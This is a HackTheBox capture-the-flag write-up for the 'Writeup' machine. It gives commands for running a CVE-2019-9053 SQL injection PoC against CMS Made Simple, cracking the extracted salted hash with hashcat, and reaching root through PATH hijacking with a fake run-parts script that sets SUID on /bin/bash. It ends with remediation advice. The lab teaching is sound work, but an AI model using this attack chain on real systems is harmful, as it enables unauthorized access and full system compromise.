---
layout: post
title: "Writeup - HackTheBox WriteUp"
date: 2024-01-25
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, CMSMadeSimple, CVE-2019-9053, SQLInjection, PrivEsc, PathHijacking, ProcessMonitoring, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2024/01/25/writeup-htb-writeup/
excerpt: "Linux machine hosting a vulnerable CMS Made Simple. SQLi exploitation CVE-2019-9053 to obtain credentials, then privilege escalation via PATH hijacking."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-8 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Writeup
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                CMS Made Simple SQLi + PATH Hijacking Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
        <div class="flex items-center gap-2">
            <i class="fas fa-calendar text-green-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">01/25/2024</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-network-wired text-blue-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Target IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">10.10.10.138</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-shield-alt text-purple-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">Debian</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-star text-amber-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**Writeup** is an <span class="text-highlight-green">**easy Linux machine**</span> hosting a <span class="text-highlight-red">**CMS Made Simple**</span> vulnerable to <span class="text-highlight-orange">**SQL injection (CVE-2019-9053)**</span>.

Exploiting this vulnerability allows retrieving <span class="text-highlight-blue">**user credentials**</span> including a salted hash. After cracking, SSH access is obtained with the `jkr` user. Local enumeration reveals this user belongs to the <span class="text-highlight-purple">**staff**</span> group, which has write permissions in `/usr/local/bin`, a directory included in the <span class="text-highlight-red">**system PATH**</span>. This configuration is exploited via <span class="text-highlight-orange">**PATH hijacking**</span> to obtain a <span class="text-highlight-green">**root shell**</span>.

<div class="grid md:grid-cols-2 gap-6 my-10">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Web enumeration (HTTP, robots.txt, CMS)</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Fundamental Linux knowledge</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding Unix group system</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Hashcat usage</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Skills Acquired
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>SQLi exploitation (CVE-2019-9053)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Salted hash cracking with Hashcat</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>PATH hijacking privilege escalation</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Process monitoring with pspy</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Network Reconnaissance

### Initial Port Scan

We start with a quick scan of all TCP ports to identify exposed services:

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138
```

### Detailed Service Enumeration

Once open ports are identified, we perform a detailed scan with version detection and NSE scripts:

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.138
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Scan Results
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 7.4p1 Debian</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Secure remote administration service</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.25</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Web server hosting the target application</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Entry Point Identified:</strong> The web service on port 80 is the initial attack vector. The scan also detects a <code>robots.txt</code> file.
    </p>
</div>


## 🌐 Phase 2 — Web Analysis and CMS Discovery

### Exploring robots.txt

The `robots.txt` file often reveals hidden directories:

```bash
curl http://10.10.10.138/robots.txt
```

Result:

```
User-agent: *
Disallow: /writeup/
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Directory Discovered:</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">/writeup/</code>
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Key Technique:</strong> The <code>Disallow</code> directive in robots.txt often reveals directories that administrators want to hide from search engines, but which remain directly accessible.
    </p>
</div>

### CMS Identification

Navigating to `http://10.10.10.138/writeup/`, we discover **CMS Made Simple**.

HTML source code analysis reveals:

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019" />
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <div class="flex items-center gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-newspaper"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">CMS Made Simple</h4>
            <p class="text-gray-600 dark:text-gray-400">Version dating from 2019</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        CMS Made Simple is an open-source content management system. A 2019 version is potentially vulnerable to known CVEs.
    </p>
</div>


## 💥 Phase 3 — CVE-2019-9053 Exploitation (SQL Injection)

### Vulnerability Analysis

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2019-9053 - SQL Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Versions:</span> CMS Made Simple ≤ 2.2.10
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> Blind Time-Based SQLi
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            A blind time-based SQL injection vulnerability allows extracting sensitive information from the database via manipulation of an unfiltered parameter.
        </div>
    </div>
</div>

### Exploitation

Downloading the PoC:

```bash
git clone https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
cd CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
python cve.py -u http://10.10.10.138/writeup/ --crack -w best110.txt
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Extracted Information
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm space-y-1">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Username:</span> <span class="text-green-600 dark:text-green-400">jkr</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Email:</span> <span class="text-green-600 dark:text-green-400">jkr@writeup.htb</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Hash:</span> <span class="text-orange-600 dark:text-orange-400">62def4866937f08cc13bab43bb14e6f7</span>
        </div>
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">Salt:</span> <span class="text-purple-600 dark:text-purple-400">5a599ef579066807</span>
        </div>
    </div>
</div>

### Hash Cracking with Hashcat

Preparing the hash file:

```bash
echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
```

Cracking (mode 20 = md5($salt.$pass)):

```bash
hashcat -m 20 -a 0 hash /usr/share/wordlists/rockyou.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-unlock mr-2 text-green-500"></i>
        <strong>Password Found:</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">raykayjay9</code>
    </p>
</div>

## 🔑 Phase 4 — SSH Access and User Flag

### SSH Connection

Attempting connection with discovered credentials:

```bash
ssh jkr@10.10.10.138
```

**Password:** `raykayjay9`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        SSH connection successful\!
    </p>
</div>

### Access Validation

```bash
id
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
    </div>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Important Observation:</strong> The user belongs to the <code>50(staff)</code> group, a non-standard group that warrants investigation.
    </p>
</div>

### User Flag Retrieval

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>User flag obtained\!</strong> First step completed.
    </p>
</div>


## 🧭 Phase 5 — Local Enumeration: The staff Group

### Group Analysis

Checking user groups:

```bash
groups jkr
```

The **staff** group stands out. According to Debian documentation:

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-book mr-2 text-cyan-500"></i>
        <strong>Debian Documentation:</strong> The "staff" group allows writing to <code>/usr/local/bin</code> and <code>/usr/local/sbin</code> without root privileges. These directories are included in the <strong>root PATH</strong>.
    </p>
</div>

### Permission Verification

```bash
ls -ld /usr/local/bin/ /usr/local/sbin/
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        drwxrwsr-x 2 root staff 20480 ... /usr/local/bin/<br>
        drwxrwsr-x 2 root staff 12288 ... /usr/local/sbin/
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Escalation Vector Identified:</strong> If a root script executes a command from the PATH, it can be <strong>hijacked</strong> by placing a malicious binary in <code>/usr/local/bin</code>.
    </p>
</div>

## 🔎 Phase 6 — Process Monitoring with pspy

### pspy Deployment

Objective: observe processes automatically executed by root.

Download and transfer:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
scp pspy32 jkr@10.10.10.138:/tmp
```

Execution:

```bash
chmod +x /tmp/pspy32
/tmp/pspy32
```

### Results Analysis

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
    <h4 class="text-xl font-bold mb-4 text-purple-600 dark:text-purple-400 flex items-center">
        <i class="fas fa-eye mr-2"></i>Critical Observation
    </h4>
    <p class="text-gray-700 dark:text-gray-300 mb-3">
        When an SSH user connects, <strong>root executes run-parts</strong> via <code>/usr/bin/env</code>, with a PATH starting with <code>/usr/local/bin</code>.
    </p>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>
            run-parts --lsbsysinit /etc/update-motd.d
        </div>
    </div>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-crosshairs mr-2 text-amber-500"></i>
        <strong>Target Identified:</strong> <code>run-parts</code> can be replaced by a malicious script in <code>/usr/local/bin</code> to be executed with root privileges.
    </p>
</div>

## ⚙️ Phase 7 — Exploitation: PATH Hijacking

### Exploitation Strategy

We will:
1. Create a fake `run-parts` binary in `/usr/local/bin`
2. This binary will set the SUID bit on `/bin/bash`
3. On next SSH connection, root will execute our binary

### Exploitation

Creating the malicious binary:

```bash
echo -e '#\!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
```

Disconnect and reconnect via SSH:

```bash
exit
ssh jkr@10.10.10.138
```

Verification:

```bash
ls -l /bin/bash
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-green-700 dark:text-green-300">
        -rwsr-xr-x 1 root root 1099016 ... /bin/bash
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        SUID bit is now set on /bin/bash\!
    </p>
</div>

## 👑 Phase 8 — Escalating to Root

### Execution with Preserved Privileges

Launching bash with `-p` option (preserve privileges):

```bash
/bin/bash -p
id
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(jkr) gid=1000(jkr) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev),1000(jkr)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        ROOT SHELL OBTAINED\! euid=0(root) achieved.
    </p>
</div>

### Root Flag Retrieval

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/jkr/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 📋 Phase 9 — Recommendations and Remediation

<div class="grid md:grid-cols-2 gap-6 my-8">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
            <i class="fas fa-globe mr-2"></i>Application
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Update CMS Made Simple to fix CVE-2019-9053</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Use strong and unique passwords</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Avoid exposing version metadata in HTML</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-center">
            <i class="fas fa-server mr-2"></i>System
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restrict staff group permissions on /usr/local/bin</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Use absolute paths in root scripts</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Limit automatic executions (update-motd)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Monitor SSH connections and suspicious activities</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Command Summary

```bash
# Network reconnaissance
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138
nmap -p$ports -sC -sV 10.10.10.138

# SQLi exploitation
python cve.py -u http://10.10.10.138/writeup/ --crack -w best110.txt
echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
hashcat -m 20 -a 0 hash /usr/share/wordlists/rockyou.txt

# SSH connection
ssh jkr@10.10.10.138

# Process monitoring
chmod +x /tmp/pspy32
/tmp/pspy32

# PATH Hijacking
echo -e '#\!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
ssh jkr@10.10.10.138
/bin/bash -p
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
        <i class="fas fa-project-diagram mr-3"></i>Complete Attack Path
    </h3>
    <div class="space-y-4">
        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and Enumeration</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → robots.txt → /writeup/ → CMS Made Simple</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation and Initial Access</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2019-9053 SQLi → Hash cracking → SSH jkr</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Local Enumeration</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Staff group → /usr/local/bin writable → pspy monitoring</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">PATH hijacking → Fake run-parts → SUID bash → Root</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CMSMadeSimple</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2019-9053</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SQLInjection</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PathHijacking</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ProcessMonitoring</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful References
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9053" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2019-9053 - CMS Made Simple SQL Injection
            </a>
        </li>
        <li>
            <a href="https://github.com/DominicBreuker/pspy" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                pspy - Process Monitoring Tool
            </a>
        </li>
        <li>
            <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path-hijacking" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Linux PATH Hijacking Techniques
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
